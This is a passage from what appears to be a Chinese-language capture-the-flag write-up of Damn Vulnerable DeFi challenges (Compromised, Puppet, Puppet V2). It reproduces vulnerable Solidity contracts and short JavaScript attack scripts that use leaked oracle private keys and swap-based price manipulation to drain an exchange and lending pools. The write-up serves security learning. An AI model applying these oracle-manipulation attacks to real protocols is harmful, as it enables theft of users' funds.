class="line">                _setPrice(sources[i], symbols[i], prices[i]);</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        renounceRole(INITIALIZER_ROLE, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) &#123;</span><br><span class="line">        _setPrice(msg.sender, symbol, newPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getMedianPrice(string calldata symbol) external view returns (uint256) &#123;</span><br><span class="line">        return _computeMedianPrice(symbol);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory prices) &#123;</span><br><span class="line">        uint256 numberOfSources = getRoleMemberCount(TRUSTED_SOURCE_ROLE);</span><br><span class="line">        prices = new uint256[](numberOfSources);</span><br><span class="line">        for (uint256 i = 0; i &lt; numberOfSources;) &#123;</span><br><span class="line">            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);</span><br><span class="line">            prices[i] = getPriceBySource(symbol, source);</span><br><span class="line">            unchecked &#123; ++i; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getPriceBySource(string memory symbol, address source) public view returns (uint256) &#123;</span><br><span class="line">        return _pricesBySource[source][symbol];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _setPrice(address source, string memory symbol, uint256 newPrice) private &#123;</span><br><span class="line">        uint256 oldPrice = _pricesBySource[source][symbol];</span><br><span class="line">        _pricesBySource[source][symbol] = newPrice;</span><br><span class="line">        emit UpdatedPrice(source, symbol, oldPrice, newPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _computeMedianPrice(string memory symbol) private view returns (uint256) &#123;</span><br><span class="line">        uint256[] memory prices = getAllPricesForSymbol(symbol);</span><br><span class="line">        LibSort.insertionSort(prices);</span><br><span class="line">        if (prices.length % 2 == 0) &#123;</span><br><span class="line">            uint256 leftPrice = prices[(prices.length / 2) - 1];</span><br><span class="line">            uint256 rightPrice = prices[prices.length / 2];</span><br><span class="line">            return (leftPrice + rightPrice) / 2;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return prices[prices.length / 2];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="TrustfulOracleInitializer-sol"><a href="#TrustfulOracleInitializer-sol" class="headerlink" title="TrustfulOracleInitializer.sol"></a>TrustfulOracleInitializer.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#123; TrustfulOracle &#125; from &quot;./TrustfulOracle.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TrustfulOracleInitializer</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract TrustfulOracleInitializer &#123;</span><br><span class="line">    event NewTrustfulOracle(address oracleAddress);</span><br><span class="line"></span><br><span class="line">    TrustfulOracle public oracle;</span><br><span class="line"></span><br><span class="line">    constructor(address[] memory sources, string[] memory symbols, uint256[] memory initialPrices) &#123;</span><br><span class="line">        oracle = new TrustfulOracle(sources, true);</span><br><span class="line">        oracle.setupInitialPrices(sources, symbols, initialPrices);</span><br><span class="line">        emit NewTrustfulOracle(address(oracle));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="Exchange-sol"><a href="#Exchange-sol" class="headerlink" title="Exchange.sol"></a>Exchange.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;./TrustfulOracle.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableNFT.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title Exchange</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract Exchange is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    DamnValuableNFT public immutable token;</span><br><span class="line">    TrustfulOracle public immutable oracle;</span><br><span class="line"></span><br><span class="line">    error InvalidPayment();</span><br><span class="line">    error SellerNotOwner(uint256 id);</span><br><span class="line">    error TransferNotApproved();</span><br><span class="line">    error NotEnoughFunds();</span><br><span class="line"></span><br><span class="line">    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);</span><br><span class="line">    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);</span><br><span class="line"></span><br><span class="line">    constructor(address _oracle) payable &#123;</span><br><span class="line">        token = new DamnValuableNFT();</span><br><span class="line">        token.renounceOwnership();</span><br><span class="line">        oracle = TrustfulOracle(_oracle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyOne() external payable nonReentrant returns (uint256 id) &#123;</span><br><span class="line">        if (msg.value == 0)</span><br><span class="line">            revert InvalidPayment();</span><br><span class="line"></span><br><span class="line">        // Price should be in [wei / NFT]</span><br><span class="line">        uint256 price = oracle.getMedianPrice(token.symbol());</span><br><span class="line">        if (msg.value &lt; price)</span><br><span class="line">            revert InvalidPayment();</span><br><span class="line"></span><br><span class="line">        id = token.safeMint(msg.sender);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            payable(msg.sender).sendValue(msg.value - price);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit TokenBought(msg.sender, id, price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sellOne(uint256 id) external nonReentrant &#123;</span><br><span class="line">        if (msg.sender != token.ownerOf(id))</span><br><span class="line">            revert SellerNotOwner(id);</span><br><span class="line">    </span><br><span class="line">        if (token.getApproved(id) != address(this))</span><br><span class="line">            revert TransferNotApproved();</span><br><span class="line"></span><br><span class="line">        // Price should be in [wei / NFT]</span><br><span class="line">        uint256 price = oracle.getMedianPrice(token.symbol());</span><br><span class="line">        if (address(this).balance &lt; price)</span><br><span class="line">            revert NotEnoughFunds();</span><br><span class="line"></span><br><span class="line">        token.transferFrom(msg.sender, address(this), id);</span><br><span class="line">        token.burn(id);</span><br><span class="line"></span><br><span class="line">        payable(msg.sender).sendValue(price);</span><br><span class="line"></span><br><span class="line">        emit TokenSold(msg.sender, id, price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题是让我们获取交易所的所有<code>ETH</code>,首先我们来看交易所当中能获取<code>ETH</code>的函数，目前看来只有<code>sellOne()</code>函数能实现这个功能，但前提是我们需要有一个<code>NFT</code>去售卖，而我们想要一个<code>NFT</code>就需要调用<code>buyOne()</code>函数去购买，而一个<code>NFT</code>的售价为<code>999  ETH</code>，而我们只有<code>0.1 ETH</code>，金额不够怎么办，我们需要知道这个<code>NFT</code>的售价是由三个用户提供的报价，然后取得中间值得到的，那么我们有没有办法去修改他们的报价呢？</p>
<p>这时我们将目光放向题目提供的两串码，这是两串十六进制码，将它们解码一下就会得到两串私钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span><br><span class="line"></span><br><span class="line">0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;</span><br></pre></td></tr></table></figure>

<p>我们可以根据两串私钥登录他们的账户，进而修改报价，之后购买一个<code>NFT</code>，之后再将报价修改，再将其卖出即可</p>
<h4 id="Attack-6"><a href="#Attack-6" class="headerlink" title="Attack"></a>Attack</h4><h5 id="js-3"><a href="#js-3" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">privateKey1 = <span class="string">&quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;</span>;</span><br><span class="line">        privateKey2 = <span class="string">&quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;</span>;</span><br><span class="line"></span><br><span class="line">        addr1 = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey1, ethers.<span class="property">provider</span>);</span><br><span class="line">        addr2 = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey2, ethers.<span class="property">provider</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> oracle.<span class="title function_">connect</span>(addr1).<span class="title function_">postPrice</span>(<span class="string">&#x27;DVNFT&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> oracle.<span class="title function_">connect</span>(addr2).<span class="title function_">postPrice</span>(<span class="string">&#x27;DVNFT&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> exchange.<span class="title function_">connect</span>(player).<span class="title function_">buyOne</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> oracle.<span class="title function_">connect</span>(addr1).<span class="title function_">postPrice</span>(<span class="string">&#x27;DVNFT&#x27;</span>,<span class="variable constant_">INITIAL_NFT_PRICE</span>);</span><br><span class="line">        <span class="keyword">await</span> oracle.<span class="title function_">connect</span>(addr2).<span class="title function_">postPrice</span>(<span class="string">&#x27;DVNFT&#x27;</span>,<span class="variable constant_">INITIAL_NFT_PRICE</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> nftToken.<span class="title function_">connect</span>(player).<span class="title function_">approve</span>(exchange.<span class="property">address</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">await</span> exchange.<span class="title function_">connect</span>(player).<span class="title function_">sellOne</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Challenge-8-Puppet"><a href="#Challenge-8-Puppet" class="headerlink" title="Challenge #8 - Puppet"></a>Challenge #8 - Puppet</h3><p>There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p>
<p>There’s a DVT market opened in an old <a target="_blank" rel="noopener" href="https://docs.uniswap.org/contracts/v1/overview">Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in liquidity.</p>
<p>Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.</p>
<h4 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h4><h5 id="PuppetPool-sol"><a href="#PuppetPool-sol" class="headerlink" title="PuppetPool.sol"></a>PuppetPool.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title PuppetPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract PuppetPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    uint256 public constant DEPOSIT_FACTOR = 2;</span><br><span class="line"></span><br><span class="line">    address public immutable uniswapPair;</span><br><span class="line">    DamnValuableToken public immutable token;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public deposits;</span><br><span class="line"></span><br><span class="line">    error NotEnoughCollateral();</span><br><span class="line">    error TransferFailed();</span><br><span class="line"></span><br><span class="line">    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);</span><br><span class="line"></span><br><span class="line">    constructor(address tokenAddress, address uniswapPairAddress) &#123;</span><br><span class="line">        token = DamnValuableToken(tokenAddress);</span><br><span class="line">        uniswapPair = uniswapPairAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allows borrowing tokens by first depositing two times their value in ETH</span><br><span class="line">    function borrow(uint256 amount, address recipient) external payable nonReentrant &#123;</span><br><span class="line">        uint256 depositRequired = calculateDepositRequired(amount);</span><br><span class="line"></span><br><span class="line">        if (msg.value &lt; depositRequired)</span><br><span class="line">            revert NotEnoughCollateral();</span><br><span class="line"></span><br><span class="line">        if (msg.value &gt; depositRequired) &#123;</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                payable(msg.sender).sendValue(msg.value - depositRequired);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unchecked &#123;</span><br><span class="line">            deposits[msg.sender] += depositRequired;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Fails if the pool doesn&#x27;t have enough tokens in liquidity</span><br><span class="line">        if(!token.transfer(recipient, amount))</span><br><span class="line">            revert TransferFailed();</span><br><span class="line"></span><br><span class="line">        emit Borrowed(msg.sender, recipient, depositRequired, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calculateDepositRequired(uint256 amount) public view returns (uint256) &#123;</span><br><span class="line">        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _computeOraclePrice() private view returns (uint256) &#123;</span><br><span class="line">        // calculates the price of the token in wei according to Uniswap pair</span><br><span class="line">        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="Analysis-7"><a href="#Analysis-7" class="headerlink" title="Analysis"></a>Analysis</h4><p>这一题是让我们想办法获取借贷池中所有的<code>token</code>，我们可以看到如果想获得所有的<code>token</code>，需要两倍的<code>ETH</code>去抵押，但我们没有这么多该怎么办吗，这时我们看到题目合约不是写死了就需要两倍而是通过<code>amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18</code>这个来计算的，而其中<code>_computeOraclePrice()</code>这个函数是获取<code>uniswapPair</code>的<code>Eth</code>和<code>token</code>的数量比值，我们可以在这里做文章，让<code>uniswapPair</code>的<code>eth</code>和<code>token</code>的比例降低，从而使得我们需要抵押的<code>eth</code>减少</p>
<p>那么如何降低呢，我们可以是用<code>uniswapPair</code>的<code>tokenToEthSwapInput()</code>函数用我们的<code>token</code>去换取一些<code>eth</code>，从而使得我们可以凭借我们现有的<code>eth</code>来掏空借贷池</p>
<p>(但目前我还不知道怎么使得它执行一次交易就能完成这些操作)</p>
<h4 id="Attack-7"><a href="#Attack-7" class="headerlink" title="Attack"></a>Attack</h4><h5 id="js-4"><a href="#js-4" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> token.<span class="title function_">connect</span>(player).<span class="title function_">approve</span>(uniswapExchange.<span class="property">address</span>,<span class="variable constant_">PLAYER_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">        <span class="keyword">await</span> uniswapExchange.<span class="title function_">connect</span>(player).<span class="title function_">tokenToEthSwapInput</span>(ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>( <span class="string">&#x27;1000&#x27;</span> ),<span class="number">9</span>,( <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBlock</span>( <span class="string">&#x27;latest&#x27;</span> )).<span class="property">timestamp</span> * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">await</span> lendingPool.<span class="title function_">connect</span>(player).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>,player.<span class="property">address</span>,&#123;<span class="attr">value</span>:ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>( <span class="string">&#x27;20&#x27;</span> )&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-9-Puppet-V2"><a href="#Challenge-9-Puppet-V2" class="headerlink" title="Challenge #9 - Puppet V2"></a>Challenge #9 - Puppet V2</h3><p>The developers of the <a target="_blank" rel="noopener" href="https://damnvulnerabledefi.xyz/challenges/puppet/">previous pool</a> seem to have learned the lesson. And released a new version!</p>
<p>Now they’re using a <a target="_blank" rel="noopener" href="https://docs.uniswap.org/contracts/v2/overview">Uniswap v2 exchange</a> as a price oracle, along with the recommended utility libraries. That should be enough.</p>
<p>You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do.</p>
<h4 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h4><h5 id="PuppetV2Pool-sol"><a href="#PuppetV2Pool-sol" class="headerlink" title="PuppetV2Pool.sol"></a>PuppetV2Pool.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol&quot;;</span><br><span class="line">import &quot;@uniswap/v2-periphery/contracts/libraries/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool);</span><br><span class="line">    function balanceOf(address account) external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title PuppetV2Pool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract PuppetV2Pool &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    address private _uniswapPair;</span><br><span class="line">    address private _uniswapFactory;</span><br><span class="line">    IERC20 private _token;</span><br><span class="line">    IERC20 private _weth;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public deposits;</span><br><span class="line"></span><br><span class="line">    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);</span><br><span class="line"></span><br><span class="line">    constructor(address wethAddress, address tokenAddress, address uniswapPairAddress, address uniswapFactoryAddress)</span><br><span class="line">        public</span><br><span class="line">    &#123;</span><br><span class="line">        _weth = IERC20(wethAddress);</span><br><span class="line">        _token = IERC20(tokenAddress);</span><br><span class="line">        _uniswapPair = uniswapPairAddress;</span><br><span class="line">        _uniswapFactory = uniswapFactoryAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice Allows borrowing tokens by first depositing three times their value in WETH</span><br><span class="line">     *         Sender must have approved enough WETH in advance.</span><br><span class="line">     *         Calculations assume that WETH and borrowed token have same amount of decimals.</span><br><span class="line">     */</span><br><span class="line">    function borrow(uint256 borrowAmount) external &#123;</span><br><span class="line">        // Calculate how much WETH the user must deposit</span><br><span class="line">        uint256 amount = calculateDepositOfWETHRequired(borrowAmount);</span><br><span class="line"></span><br><span class="line">        // Take the WETH</span><br><span class="line">        _weth.transferFrom(msg.sender, address(this), amount);</span><br><span class="line"></span><br><span class="line">        // internal accounting</span><br><span class="line">        deposits[msg.sender] += amount;</span><br><span class="line"></span><br><span class="line">        require(_token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123;</span><br><span class="line">        uint256 depositFactor = 3;</span><br><span class="line">        return _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fetch the price from Uniswap v2 using the official libraries</span><br><span class="line">    function _getOracleQuote(uint256 amount) private view returns (uint256) &#123;</span><br><span class="line">        (uint256 reservesWETH, uint256 reservesToken) =</span><br><span class="line">            UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));</span><br><span class="line">        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-8"><a href="#Analysis-8" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题看似换了计算方式，实则大同小异，只是把计算对象换为了<code>token</code>和<code>weth</code>的比值，而我们需要存入$\frac{3}{10}$的借贷金，我们只需要通过<code>uniswapv2</code>的<code>swapExactTokensForTokens（）</code>函数用<code>token</code>来换取一些<code>weth</code>来降低比值即可，再将我们一部分<code>ETH</code>换为<code>WETH</code>即可</p>
<h4 id="Attack-8"><a href="#Attack-8" class="headerlink" title="Attack"></a>Attack</h4><h5 id="js-5"><a href="#js-5" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> token.<span class="title function_">connect</span>(player).<span class="title function_">approve</span>(uniswapRouter.<span class="property">address</span>,<span class="variable constant_">PLAYER_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">        <span class="keyword">await</span> uniswapRouter.<span class="title function_">connect</span>(player).<span class="title function_">swapExactTokensForTokens</span>(<span class="variable constant_">PLAYER_INITIAL_TOKEN_BALANCE</span>,<span class="number">9n</span> * <span class="number">10n</span> ** <span class="number">18n</span>,[token.<span class="property">address</span>,weth.<span class="property">address</span>],player.<span class="property">address</span>,(<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBlock</span>(<span class="string">&#x27;latest&#x27;</span>)).<span class="property">timestamp</span> * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">await</span> weth.<span class="title function_">connect</span>(player).<span class="title function_">approve</span>(lendingPool.<span class="property">address</span>,<span class="number">30n</span> * <span class="number">10n</span> ** <span class="number">18n</span>);</span><br><span class="line">        <span class="keyword">await</span> weth.<span class="title function_">connect</span>(player).<span class="title function_">deposit</span>(&#123; <span class="attr">value</span>: <span class="string">&#x27;19900000000000000000&#x27;</span> &#125;);</span><br><span class="line">        <span class="keyword">await</span> lendingPool.<span class="title function_">connect</span>(player).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Challenge-10-Free-Rider"><a href="#Challenge-10-Free-Rider" class="headerlink" title="Challenge #10 - Free Rider"></a>Challenge #10 - Free Rider</h3><p>A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p>
<p>The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way.</p>
<p>You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.</p>
<p>If only you could get free ETH, at least for an instant.</p>
